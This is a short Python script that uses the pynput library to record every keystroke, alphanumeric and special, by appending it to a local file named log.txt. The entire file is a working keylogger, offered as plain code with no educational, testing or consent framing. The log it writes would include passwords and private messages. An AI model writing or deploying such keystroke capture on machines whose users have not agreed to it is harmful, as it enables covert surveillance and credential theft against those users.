import pynput
from pynput import keyboard


def on_press(key):
    try:
        with open("log.txt", "a") as f:  # Open the file in append mode
            print("alphanumeric key {0} pressed".format(key.char), file=f)
    except AttributeError:
        with open("log.txt", "a") as f:  # Open the file in append mode
            print("special key {0} pressed".format(key), file=f)


# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
